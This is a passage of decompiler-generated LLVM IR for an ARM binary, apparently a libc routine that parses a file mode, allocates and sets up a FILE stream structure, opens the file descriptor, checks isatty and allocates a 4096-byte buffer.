dec_label_pc_1581c:                               ; preds = %dec_label_pc_15810
  store i32 %v0_15810, i32* @r0, align 4
  %v0_15820 = call i32 @free()
  store i32 %v0_15820, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15bcc

dec_label_pc_15828:                               ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_1582c

dec_label_pc_1582c:                               ; preds = %bb, %bb49, %dec_label_pc_15828
  %v1_15844 = phi i32 [ 1089, %bb49 ], [ 577, %bb ], [ 1, %dec_label_pc_15828 ]
  %v1_1582c = add i32 %v0_157b8, 1
  %v2_1582c = inttoptr i32 %v1_1582c to i8*
  %v3_1582c = load i8, i8* %v2_1582c, align 1
  %v2_15830 = icmp ugt i8 %v3_1582c, 97
  store i1 %v2_15830, i1* %cpsr_c.global-to-local, align 1
  %v7_15830 = icmp eq i8 %v3_1582c, 98
  %v1_1582c.v0_157b8 = select i1 %v7_15830, i32 %v1_1582c, i32 %v0_157b8
  store i32 %v1_1582c.v0_157b8, i32* %r3.global-to-local, align 4
  %v1_1583c = add i32 %v1_1582c.v0_157b8, 1
  %v2_1583c = inttoptr i32 %v1_1583c to i8*
  %v3_1583c = load i8, i8* %v2_1583c, align 1
  %v4_1583c = zext i8 %v3_1583c to i32
  store i32 %v4_1583c, i32* @r3, align 4
  %v2_15840 = icmp ugt i8 %v3_1583c, 42
  store i1 %v2_15840, i1* %cpsr_c.global-to-local, align 1
  %v7_15840 = icmp eq i8 %v3_1583c, 43
  br i1 %v7_15840, label %bb52, label %.thread3

bb52:                                             ; preds = %dec_label_pc_1582c
  store i32 %v1_15844, i32* @r3, align 4
  %v2_15848 = add nuw nsw i32 %v1_15844, 1
  store i32 %v2_15848, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_1582c, %bb52
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1584c = icmp eq i32 %v0_157d0, 0
  br i1 %v2_1584c, label %dec_label_pc_15854, label %dec_label_pc_15890

dec_label_pc_15854:                               ; preds = %.thread3
  store i32 68, i32* %r0.global-to-local, align 4
  %v1_15858 = call i32 @malloc(i32 68)
  store i32 %v1_15858, i32* %r0.global-to-local, align 4
  store i32 %v1_15858, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_1585c = icmp eq i32 %v1_15858, 0
  br i1 %v3_1585c, label %dec_label_pc_15bd0, label %dec_label_pc_15864

dec_label_pc_15864:                               ; preds = %dec_label_pc_15854
  %v0_15868 = load i32, i32* @r8, align 4
  %v2_15868 = add i32 %v0_15868, -33136
  store i32 %v2_15868, i32* %r3.global-to-local, align 4
  %v1_1586c = inttoptr i32 %v2_15868 to i32*
  %v2_1586c = load i32, i32* %v1_1586c, align 4
  store i32 %v2_1586c, i32* %r0.global-to-local, align 4
  %v3_1586c = add i32 %v0_15868, -33132
  %v4_1586c = inttoptr i32 %v3_1586c to i32*
  %v5_1586c = load i32, i32* %v4_1586c, align 4
  store i32 %v5_1586c, i32* @r1, align 4
  %v6_1586c = add i32 %v0_15868, -33128
  %v7_1586c = inttoptr i32 %v6_1586c to i32*
  %v8_1586c = load i32, i32* %v7_1586c, align 4
  store i32 %v8_1586c, i32* %r2.global-to-local, align 4
  %v2_15878 = add i32 %v1_15858, 8
  %v3_15878 = inttoptr i32 %v2_15878 to i32*
  store i32 0, i32* %v3_15878, align 4
  %v2_15880 = load i32, i32* @r5, align 4
  %v3_15880 = inttoptr i32 %v2_15880 to i16*
  store i16 8192, i16* %v3_15880, align 2
  %v2_15884 = load i32, i32* %r0.global-to-local, align 4
  %v0_15888 = load i32, i32* @r5, align 4
  %v1_15888 = add i32 %v0_15888, 56
  store i32 %v1_15888, i32* @r3, align 4
  %v1_1588c = inttoptr i32 %v1_15888 to i32*
  store i32 %v2_15884, i32* %v1_1588c, align 4
  %v3_1588c = add i32 %v0_15888, 60
  %v4_1588c = inttoptr i32 %v3_1588c to i32*
  %v5_1588c = load i32, i32* @r1, align 4
  store i32 %v5_1588c, i32* %v4_1588c, align 4
  %v6_1588c = add i32 %v0_15888, 64
  %v7_1588c = inttoptr i32 %v6_1588c to i32*
  %v8_1588c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_1588c, i32* %v7_1588c, align 4
  %v0_15890.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_15890

dec_label_pc_15890:                               ; preds = %.thread3, %dec_label_pc_15864
  %v0_158e8 = phi i32 [ %v0_157d4, %.thread3 ], [ %v0_15890.pre, %dec_label_pc_15864 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_15890 = icmp slt i32 %v0_158e8, 0
  br i1 %v1_15890, label %dec_label_pc_158e8, label %dec_label_pc_15898

dec_label_pc_15898:                               ; preds = %dec_label_pc_15890
  %v0_1589c = load i32, i32* @r4, align 4
  %v2_1589c = and i32 %v0_1589c, 131075
  %v1_158a0 = add nuw nsw i32 %v2_1589c, 1
  store i32 %v1_158a0, i32* %r2.global-to-local, align 4
  %v0_158a4 = load i32, i32* @r7, align 4
  %v1_158a4 = add i32 %v0_158a4, 1
  %v2_158a8 = and i32 %v1_158a4, %v1_158a0
  store i32 %v2_158a8, i32* %r3.global-to-local, align 4
  %v3_158ac = icmp uge i32 %v2_158a8, %v1_158a0
  store i1 %v3_158ac, i1* %cpsr_c.global-to-local, align 1
  %v9_158ac = icmp eq i32 %v2_158a8, %v1_158a0
  %v1_158b0 = load i32, i32* @r5, align 4
  %v2_158b0 = add i32 %v1_158b0, 4
  %v3_158b0 = inttoptr i32 %v2_158b0 to i32*
  store i32 %v0_158e8, i32* %v3_158b0, align 4
  br i1 %v9_158ac, label %dec_label_pc_158b8, label %dec_label_pc_157f4

dec_label_pc_158b8:                               ; preds = %dec_label_pc_15898
  %v0_158b8 = load i32, i32* @r4, align 4
  %v1_158b8 = load i32, i32* @r7, align 4
  %v2_158b8 = sub i32 -1, %v1_158b8
  %v3_158b8 = and i32 %v0_158b8, %v2_158b8
  store i32 %v3_158b8, i32* @r3, align 4
  %v1_158bc = and i32 %v3_158b8, 1024
  %v2_158bc = icmp eq i32 %v1_158bc, 0
  br i1 %v2_158bc, label %dec_label_pc_158dc, label %dec_label_pc_158c4

dec_label_pc_158c4:                               ; preds = %dec_label_pc_158b8
  %v0_158c4 = load i32, i32* @r6, align 4
  store i32 %v0_158c4, i32* %r0.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v2_158d0 = call i32 @__libc_fcntl(i32 %v0_158c4, i32 4)
  store i32 %v2_158d0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_158d4 = icmp eq i32 %v2_158d0, 0
  br i1 %v2_158d4, label %dec_label_pc_158c4.dec_label_pc_158dc_crit_edge, label %dec_label_pc_157f4

dec_label_pc_158c4.dec_label_pc_158dc_crit_edge:  ; preds = %dec_label_pc_158c4
  %v0_158dc.pre = load i32, i32* @r7, align 4
  %v0_158e0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_158dc

dec_label_pc_158dc:                               ; preds = %dec_label_pc_158c4.dec_label_pc_158dc_crit_edge, %dec_label_pc_158b8
  %v0_158e0 = phi i32 [ %v0_158e0.pre, %dec_label_pc_158c4.dec_label_pc_158dc_crit_edge ], [ %v0_158b8, %dec_label_pc_158b8 ]
  %v0_158dc = phi i32 [ %v0_158dc.pre, %dec_label_pc_158c4.dec_label_pc_158dc_crit_edge ], [ %v1_158b8, %dec_label_pc_158b8 ]
  %v1_158dc = and i32 %v0_158dc, 131072
  store i32 %v1_158dc, i32* %r3.global-to-local, align 4
  %v2_158e0 = or i32 %v1_158dc, %v0_158e0
  store i32 %v2_158e0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1590c

dec_label_pc_158e8:                               ; preds = %dec_label_pc_15890
  %v2_158e8 = icmp eq i32 %v0_158e8, -1
  store i1 %v2_158e8, i1* %cpsr_c.global-to-local, align 1
  %v7_158e8 = icmp eq i32 %v0_158e8, -1
  %v0_158f4.pre = load i32, i32* @r4, align 4
  br i1 %v7_158e8, label %dec_label_pc_158e8._crit_edge, label %bb53

bb53:                                             ; preds = %dec_label_pc_158e8
  %v2_158ec = or i32 %v0_158f4.pre, 131072
  store i32 %v2_158ec, i32* @r4, align 4
  br label %dec_label_pc_158e8._crit_edge

dec_label_pc_158e8._crit_edge:                    ; preds = %dec_label_pc_158e8, %bb53
  %v0_158f4 = phi i32 [ %v2_158ec, %bb53 ], [ %v0_158f4.pre, %dec_label_pc_158e8 ]
  %v0_158f0 = load i32, i32* @r7, align 4
  store i32 %v0_158f0, i32* %r0.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_158fc = call i32 @__libc_open(i32 %v0_158f0, i32 %v0_158f4)
  store i32 %v2_158fc, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_15900 = icmp slt i32 %v2_158fc, 0
  %v1_15904 = load i32, i32* @r5, align 4
  %v2_15904 = add i32 %v1_15904, 4
  %v3_15904 = inttoptr i32 %v2_15904 to i32*
  store i32 %v2_158fc, i32* %v3_15904, align 4
  br i1 %v1_15900, label %dec_label_pc_15810, label %.dec_label_pc_1590c_crit_edge

.dec_label_pc_1590c_crit_edge:                    ; preds = %dec_label_pc_158e8._crit_edge
  %v0_15910.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1590c

dec_label_pc_1590c:                               ; preds = %.dec_label_pc_1590c_crit_edge, %dec_label_pc_158dc
  %v0_15928 = phi i32 [ %v0_15910.pre, %.dec_label_pc_1590c_crit_edge ], [ %v2_158e0, %dec_label_pc_158dc ]
  %v0_1590c = load i32, i32* @r5, align 4
  %v1_1590c = inttoptr i32 %v0_1590c to i16*
  %v2_1590c = load i16, i16* %v1_1590c, align 2
  %v3_1590c = zext i16 %v2_1590c to i32
  %v1_15910 = urem i32 %v0_15928, 4
  %v1_15914 = and i32 %v0_15928, 1024
  %v1_15918 = and i32 %v3_1590c, 8192
  %v1_1591c = add nuw nsw i32 %v1_15910, 1
  %v2_15920 = or i32 %v1_15918, %v1_15914
  store i32 %v2_15920, i32* %r3.global-to-local, align 4
  %v1_15924 = xor i32 %v1_1591c, 3
  %v1_15928 = and i32 %v0_15928, 131072
  store i32 %v1_15928, i32* %r2.global-to-local, align 4
  %v2_15928 = icmp eq i32 %v1_15928, 0
  %v1_1592c = add i32 %v0_1590c, 4
  %v2_1592c = inttoptr i32 %v1_1592c to i32*
  %v3_1592c = load i32, i32* %v2_1592c, align 4
  store i32 %v3_1592c, i32* @r4, align 4
  br i1 %v2_15928, label %bb55, label %bb54

bb54:                                             ; preds = %dec_label_pc_1590c
  store i32 32768, i32* %r2.global-to-local, align 4
  br label %bb55

bb55:                                             ; preds = %dec_label_pc_1590c, %bb54
  %v0_15938 = phi i32 [ 0, %dec_label_pc_1590c ], [ 32768, %bb54 ]
  %v4_15934 = mul nuw nsw i32 %v1_15924, 16
  %v5_15934 = or i32 %v2_15920, %v4_15934
  store i32 %v5_15934, i32* %r3.global-to-local, align 4
  %v2_15938 = or i32 %v0_15938, %v5_15934
  store i32 %v2_15938, i32* %r2.global-to-local, align 4
  %v2_1593c = icmp ugt i32 %v3_1592c, 2147483646
  store i1 %v2_1593c, i1* %cpsr_c.global-to-local, align 1
  %v8_1593c = icmp eq i32 %v3_1592c, 2147483647
  %v1_15940 = trunc i32 %v2_15938 to i16
  store i16 %v1_15940, i16* %v1_1590c, align 2
  br i1 %v8_1593c, label %dec_label_pc_15980, label %dec_label_pc_15948

dec_label_pc_15948:                               ; preds = %bb55
  store i32 48532, i32* %r3.global-to-local, align 4
  %v0_1594c = call i32 @__aeabi_read_tp()
  %v3_15950 = load i16, i16* @global_var_216ec.303, align 2
  %v4_15950 = sext i16 %v3_15950 to i32
  store i32 %v4_15950, i32* @r3, align 4
  store i32 %v0_1594c, i32* @r6, align 4
  %v0_15958 = load i32, i32* @r4, align 4
  store i32 %v0_15958, i32* @r0, align 4
  %v2_1595c = add i32 %v4_15950, %v0_1594c
  %v3_1595c = inttoptr i32 %v2_1595c to i32*
  %v4_1595c = load i32, i32* %v3_1595c, align 4
  store i32 %v4_1595c, i32* @r4, align 4
  %v1_15960 = call i32 @isatty(i32 %v0_15958)
  store i32 %v1_15960, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15964 = icmp eq i32 %v1_15960, 0
  br i1 %v2_15964, label %.thread5, label %bb56

bb56:                                             ; preds = %dec_label_pc_15948
  %v1_15968 = load i32, i32* @r5, align 4
  %v2_15968 = inttoptr i32 %v1_15968 to i16*
  %v3_15968 = load i16, i16* %v2_15968, align 2
  %v4_15968 = zext i16 %v3_15968 to i32
  %v2_1596c = or i32 %v4_15968, 256
  store i32 %v2_1596c, i32* %r3.global-to-local, align 4
  %v2_15970 = trunc i32 %v2_1596c to i16
  store i16 %v2_15970, i16* %v2_15968, align 2
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_15948, %bb56
  %v3_15978 = load i16, i16* @global_var_216ec.303, align 2
  %v4_15978 = sext i16 %v3_15978 to i32
  store i32 %v4_15978, i32* %r3.global-to-local, align 4
  %v0_1597c = load i32, i32* @r4, align 4
  %v1_1597c = load i32, i32* @r6, align 4
  %v3_1597c = add i32 %v1_1597c, %v4_15978
  %v4_1597c = inttoptr i32 %v3_1597c to i32*
  store i32 %v0_1597c, i32* %v4_1597c, align 4
  br label %dec_label_pc_15980

dec_label_pc_15980:                               ; preds = %bb55, %.thread5
  %v0_15980 = load i32, i32* @r5, align 4
  %v1_15980 = add i32 %v0_15980, 8
  %v2_15980 = inttoptr i32 %v1_15980 to i32*
  %v3_15980 = load i32, i32* %v2_15980, align 4
  store i32 %v3_15980, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15984 = icmp eq i32 %v3_15980, 0
  br i1 %v2_15984, label %dec_label_pc_1598c, label %bb57

dec_label_pc_1598c:                               ; preds = %dec_label_pc_15980
  store i32 4096, i32* %r0.global-to-local, align 4
  %v1_15990 = call i32 @malloc(i32 4096)
  store i32 %v1_15990, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15994 = icmp eq i32 %v1_15990, 0
  %v1_159a4.pre = load i32, i32* @r5, align 4
  br i1 %v2_15994, label %.thread9, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1598c
  %v2_15998 = inttoptr i32 %v1_159a4.pre to i16*
  %v3_15998 = load i16, i16* %v2_15998, align 2
  %v4_15998 = zext i16 %v3_15998 to i32
  %v2_1599c = add i32 %v1_15990, 4096
  store i32 %v2_1599c, i32* %r2.global-to-local, align 4
  %v2_159a0 = or i32 %v4_15998, 16384
  store i32 %v2_159a0, i32* %r3.global-to-local, align 4
  %v2_159a4 = add i32 %v1_159a4.pre, 8
  %v3_159a4 = inttoptr i32 %v2_159a4 to i32*
  store i32 %v1_15990, i32* %v3_159a4, align 4
  %v1_159a8 = load i32, i32* %r2.global-to-local, align 4
  %v2_159a8 = load i32, i32* @r5, align 4
  %v3_159a8 = add i32 %v2_159a8, 12
  %v4_159a8 = inttoptr i32 %v3_159a8 to i32*
  store i32 %v1_159a8, i32* %v4_159a8, align 4
  %v1_159ac = load i32, i32* %r3.global-to-local, align 4
  %v2_159ac = trunc i32 %v1_159ac to i16
  %v3_159ac = load i32, i32* @r5, align 4
  %v4_159ac = inttoptr i32 %v3_159ac to i16*
  store i16 %v2_159ac, i16* %v4_159ac, align 2
  br label %bb57

.thread9:                                         ; preds = %dec_label_pc_1598c
  %v2_159a437 = add i32 %v1_159a4.pre, 8
  %v3_159a438 = inttoptr i32 %v2_159a437 to i32*
  store i32 0, i32* %v3_159a438, align 4
  %v2_159b0 = load i32, i32* @r5, align 4
  %v3_159b0 = add i32 %v2_159b0, 12
  %v4_159b0 = inttoptr i32 %v3_159b0 to i32*
  store i32 0, i32* %v4_159b0, align 4
  br label %bb57

bb57:                                             ; preds = %.thread8, %dec_label_pc_15980, %.thread9
  store i32 92, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v0_159bc = load i32, i32* @r8, align 4
  %v2_159bc = add i32 %v0_159bc, 92
  %v3_159bc = inttoptr i32 %v2_159bc to i32*
  %v4_159bc = load i32, i32* %v3_159bc, align 4
  store i32 %v4_159bc, i32* %r3.global-to-local, align 4
  %v2_159c0 = load i32, i32* @r5, align 4
  %v3_159c0 = add i32 %v2_159c0, 2
  %v4_159c0 = inttoptr i32 %v3_159c0 to i8*
  store i8 0, i8* %v4_159c0, align 1
  %v0_159c4 = load i32, i32* @r5, align 4
  %v1_159c4 = inttoptr i32 %v0_159c4 to i16*
  %v2_159c4 = load i16, i16* %v1_159c4, align 2
  %v3_159c4 = zext i16 %v2_159c4 to i32
  store i32 %v3_159c4, i32* %r2.global-to-local, align 4
  %v0_159c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_159c8 = inttoptr i32 %v0_159c8 to i32*
  %v2_159c8 = load i32, i32* %v1_159c8, align 4
  store i32 %v2_159c8, i32* @r1, align 4
  %v1_159cc = add i32 %v0_159c4, 8
  %v2_159cc = inttoptr i32 %v1_159cc to i32*
  %v3_159cc = load i32, i32* %v2_159cc, align 4
  store i32 %v3_159cc, i32* %r3.global-to-local, align 4
  %v1_159d0 = and i32 %v3_159c4, 8192
  %v2_159d0 = icmp eq i32 %v1_159d0, 0
  %v2_159d4 = add i32 %v0_159c4, 20
  %v3_159d4 = inttoptr i32 %v2_159d4 to i32*
  store i32 %v3_159cc, i32* %v3_159d4, align 4
  %v0_159d8 = load i32, i32* @r1, align 4
  %v1_159d8 = load i32, i32* @r5, align 4
  %v2_159d8 = add i32 %v1_159d8, 52
  %v3_159d8 = inttoptr i32 %v2_159d8 to i32*
  store i32 %v0_159d8, i32* %v3_159d8, align 4
  %v0_159dc = load i32, i32* %r3.global-to-local, align 4
  %v1_159dc = load i32, i32* @r5, align 4
  %v2_159dc = add i32 %v1_159dc, 24
  %v3_159dc = inttoptr i32 %v2_159dc to i32*
  store i32 %v0_159dc, i32* %v3_159dc, align 4
  %v0_159e0 = load i32, i32* %r3.global-to-local, align 4
  %v1_159e0 = load i32, i32* @r5, align 4
  %v2_159e0 = add i32 %v1_159e0, 28
  %v3_159e0 = inttoptr i32 %v2_159e0 to i32*
  store i32 %v0_159e0, i32* %v3_159e0, align 4
  %v0_159e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_159e4 = load i32, i32* @r5, align 4
  %v2_159e4 = add i32 %v1_159e4, 16
  %v3_159e4 = inttoptr i32 %v2_159e4 to i32*
  store i32 %v0_159e4, i32* %v3_159e4, align 4
  %v0_159e8 = load i32, i32* %r4.global-to-local, align 4
  %v1_159e8 = load i32, i32* @r5, align 4
  %v2_159e8 = add i32 %v1_159e8, 44
  %v3_159e8 = inttoptr i32 %v2_159e8 to i32*
  store i32 %v0_159e8, i32* %v3_159e8, align 4
  br i1 %v2_159d0, label %dec_label_pc_15bd0, label %dec_label_pc_159f0

dec_label_pc_159f0:                               ; preds = %bb57
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_159f4 = load i32, i32* @r8, align 4
  %v2_159f4 = add i32 %v0_159f4, 160
  %v3_159f4 = inttoptr i32 %v2_159f4 to i32*
  %v4_159f4 = load i32, i32* %v3_159f4, align 4
  store i32 %v4_159f4, i32* %r7.global-to-local, align 4
  %v0_159f8 = call i32 @__aeabi_read_tp()
  store i32 %v0_159f8, i32* %r0.global-to-local, align 4
  %v1_159fc = add i32 %v4_159f4, 8
  %v2_159fc = inttoptr i32 %v1_159fc to i32*
  %v3_159fc = load i32, i32* %v2_159fc, align 4
  store i32 %v3_159fc, i32* %r3.global-to-local, align 4
  %v1_15a00 = add i32 %v0_159f8, -1168
  store i32 %v1_15a00, i32* %r6.global-to-local, align 4
  %v3_15a04 = icmp uge i32 %v3_159fc, %v1_15a00
  store i1 %v3_15a04, i1* %cpsr_c.global-to-local, align 1
  %v9_15a04 = icmp eq i32 %v3_159fc, %v1_15a00
  br i1 %v9_15a04, label %dec_label_pc_15a48, label %dec_label_pc_15a0c

dec_label_pc_15a0c:                               ; preds = %dec_label_pc_159f0
  store i32 %v4_159f4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15a14

dec_label_pc_15a14:                               ; preds = %dec_label_pc_15a20.dec_label_pc_15a14_crit_edge, %dec_label_pc_15a0c
  %v0_15a14 = phi i32 [ %v0_15a14.pre, %dec_label_pc_15a20.dec_label_pc_15a14_crit_edge ], [ %v4_159f4, %dec_label_pc_15a0c ]
  %v1_15a14 = inttoptr i32 %v0_15a14 to i32*
  %v2_15a14 = load i32, i32* %v1_15a14, align 4
  store i32 %v2_15a14, i32* %r3.global-to-local, align 4
  %v1_15a18 = load i32, i32* %r4.global-to-local, align 4
  %v3_15a18 = icmp uge i32 %v2_15a14, %v1_15a18
  store i1 %v3_15a18, i1* %cpsr_c.global-to-local, align 1
  %v9_15a18 = icmp eq i32 %v2_15a14, %v1_15a18
  br i1 %v9_15a18, label %dec_label_pc_15a20, label %dec_label_pc_15a38

dec_label_pc_15a20:                               ; preds = %dec_label_pc_15a14
  store i32 %v2_15a14, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15a30 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15a30, label %dec_label_pc_15a34, label %dec_label_pc_15a20.dec_label_pc_15a14_crit_edge

dec_label_pc_15a20.dec_label_pc_15a14_crit_edge:  ; preds = %dec_label_pc_15a20
  %v0_15a14.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15a14

dec_label_pc_15a34:                               ; preds = %dec_label_pc_15a20
  %v0_15a34 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15a34, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15a38

dec_label_pc_15a38:                               ; preds = %dec_label_pc_15a14, %dec_label_pc_15a34
  %v0_15a38 = phi i32 [ %v0_15a34, %dec_label_pc_15a34 ], [ %v2_15a14, %dec_label_pc_15a14 ]
  %v1_15a38 = phi i32 [ %v0_15a34, %dec_label_pc_15a34 ], [ %v1_15a18, %dec_label_pc_15a14 ]
  %v3_15a38 = icmp uge i32 %v0_15a38, %v1_15a38
  store i1 %v3_15a38, i1* %cpsr_c.global-to-local, align 1
  %v9_15a38 = icmp eq i32 %v0_15a38, %v1_15a38
  br i1 %v9_15a38, label %bb59, label %bb58

bb58:                                             ; preds = %dec_label_pc_15a38
  %v1_15a3c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_15a3c, i32* %r0.global-to-local, align 4
  br label %bb59

bb59:                                             ; preds = %dec_label_pc_15a38, %bb58
  %v1_15a40 = xor i1 %v9_15a38, true
  call void @__pseudo_cond_branch(i1 %v1_15a40, i32 ptrtoint (i32* @global_var_13c8c.468 to i32))
  %v0_15a44 = load i32, i32* %r6.global-to-local, align 4
  %v1_15a44 = load i32, i32* %r7.global-to-local, align 4
  %v2_15a44 = add i32 %v1_15a44, 8
  %v3_15a44 = inttoptr i32 %v2_15a44 to i32*
  store i32 %v0_15a44, i32* %v3_15a44, align 4
  %v1_15a64.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15a48

dec_label_pc_15a48:                               ; preds = %dec_label_pc_159f0, %bb59
  %v1_15a64 = phi i32 [ %v3_159fc, %dec_label_pc_159f0 ], [ %v1_15a64.pre, %bb59 ]
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_15a4c = load i32, i32* @r8, align 4
  %v2_15a4c = add i32 %v0_15a4c, 160
  %v3_15a4c = inttoptr i32 %v2_15a4c to i32*
  %v4_15a4c = load i32, i32* %v3_15a4c, align 4
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_15a54 = add i32 %v0_15a4c, 152
  %v3_15a54 = inttoptr i32 %v2_15a54 to i32*
  %v4_15a54 = load i32, i32* %v3_15a54, align 4
  store i32 %v4_15a54, i32* %r7.global-to-local, align 4
  %v1_15a58 = add i32 %v4_15a4c, 4
  %v2_15a58 = inttoptr i32 %v1_15a58 to i32*
  %v3_15a58 = load i32, i32* %v2_15a58, align 4
  store i32 %v3_15a58, i32* %r3.global-to-local, align 4
  %v1_15a5c = add i32 %v4_15a54, 8
  %v2_15a5c = inttoptr i32 %v1_15a5c to i32*
  %v3_15a5c = load i32, i32* %v2_15a5c, align 4
  store i32 %v3_15a5c, i32* %r2.global-to-local, align 4
  %v1_15a60 = add i32 %v3_15a58, 1
  store i32 %v1_15a60, i32* %r3.global-to-local, align 4
  %v3_15a64 = icmp uge i32 %v3_15a5c, %v1_15a64
  store i1 %v3_15a64, i1* %cpsr_c.global-to-local, align 1
  %v9_15a64 = icmp eq i32 %v3_15a5c, %v1_15a64
  store i32 %v1_15a60, i32* %v2_15a58, align 4
  br i1 %v9_15a64, label %dec_label_pc_15ab0, label %dec_label_pc_15a70

dec_label_pc_15a70:                               ; preds = %dec_label_pc_15a48
  %v0_15a74 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_15a74, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_15a7c95 = inttoptr i32 %v0_15a74 to i32*
  %v2_15a7c96 = load i32, i32* %v1_15a7c95, align 4
  store i32 %v2_15a7c96, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_15a8098 = icmp eq i32 %v2_15a7c96, 0
  br i1 %v9_15a8098, label %dec_label_pc_15a88, label %dec_label_pc_15aa0

dec_label_pc_15a88:                               ; preds = %dec_label_pc_15a70, %dec_label_pc_15a88.dec_label_pc_15a7c_crit_edge
  %v0_15a8899 = phi i32 [ %v1_15a80.pre, %dec_label_pc_15a88.dec_label_pc_15a7c_crit_edge ], [ 0, %dec_label_pc_15a70 ]
  store i32 %v0_15a8899, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15a98 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15a98, label %dec_label_pc_15a9c, label %dec_label_pc_15a88.dec_label_pc_15a7c_crit_edge

dec_label_pc_15a88.dec_label_pc_15a7c_crit_edge:  ; preds = %dec_label_pc_15a88
  %v0_15a7c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15a80.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15a7c = inttoptr i32 %v0_15a7c.pre to i32*
  %v2_15a7c = load i32, i32* %v1_15a7c, align 4
  store i32 %v2_15a7c, i32* %r3.global-to-local, align 4
  %v3_15a80 = icmp uge i32 %v2_15a7c, %v1_15a80.pre
  store i1 %v3_15a80, i1* %cpsr_c.global-to-local, align 1
  %v9_15a80 = icmp eq i32 %v2_15a7c, %v1_15a80.pre
  br i1 %v9_15a80, label %dec_label_pc_15a88, label %dec_label_pc_15aa0

dec_label_pc_15a9c:                               ; preds = %dec_label_pc_15a88
  %v0_15a9c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15a9c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15aa0

dec_label_pc_15aa0:                               ; preds = %dec_label_pc_15a70, %dec_label_pc_15a88.dec_label_pc_15a7c_crit_edge, %dec_label_pc_15a9c
  %v0_15aa0 = phi i32 [ %v0_15a9c, %dec_label_pc_15a9c ], [ %v2_15a7c96, %dec_label_pc_15a70 ], [ %v2_15a7c, %dec_label_pc_15a88.dec_label_pc_15a7c_crit_edge ]
  %v1_15aa0 = phi i32 [ %v0_15a9c, %dec_label_pc_15a9c ], [ 0, %dec_label_pc_15a70 ], [ %v1_15a80.pre, %dec_label_pc_15a88.dec_label_pc_15a7c_crit_edge ]
  %v3_15aa0 = icmp uge i32 %v0_15aa0, %v1_15aa0
  store i1 %v3_15aa0, i1* %cpsr_c.global-to-local, align 1
  %v9_15aa0 = icmp eq i32 %v0_15aa0, %v1_15aa0
  br i1 %v9_15aa0, label %bb61, label %bb60

bb60:                                             ; preds = %dec_label_pc_15aa0
  %v1_15aa4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_15aa4, i32* %r0.global-to-local, align 4
  br label %bb61

bb61:                                             ; preds = %dec_label_pc_15aa0, %bb60
  %v1_15aa8 = xor i1 %v9_15aa0, true
  call void @__pseudo_cond_branch(i1 %v1_15aa8, i32 ptrtoint (i32* @global_var_13c8c.468 to i32))
  %v0_15aac = load i32, i32* %r6.global-to-local, align 4
  %v1_15aac = load i32, i32* %r7.global-to-local, align 4
  %v2_15aac = add i32 %v1_15aac, 8
  %v3_15aac = inttoptr i32 %v2_15aac to i32*
  store i32 %v0_15aac, i32* %v3_15aac, align 4
  br label %dec_label_pc_15ab0

dec_label_pc_15ab0:                               ; preds = %dec_label_pc_15a48, %bb61
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_15ab4 = load i32, i32* @r8, align 4
  %v2_15ab4 = add i32 %v0_15ab4, 152
  %v3_15ab4 = inttoptr i32 %v2_15ab4 to i32*
  %v4_15ab4 = load i32, i32* %v3_15ab4, align 4
  store i32 %v4_15ab4, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v2_15abc = add i32 %v0_15ab4, 76
  %v3_15abc = inttoptr i32 %v2_15abc to i32*
  %v4_15abc = load i32, i32* %v3_15abc, align 4
  store i32 %v4_15abc, i32* @r1, align 4
  %v1_15ac0 = add i32 %v4_15ab4, 4
  %v2_15ac0 = inttoptr i32 %v1_15ac0 to i32*
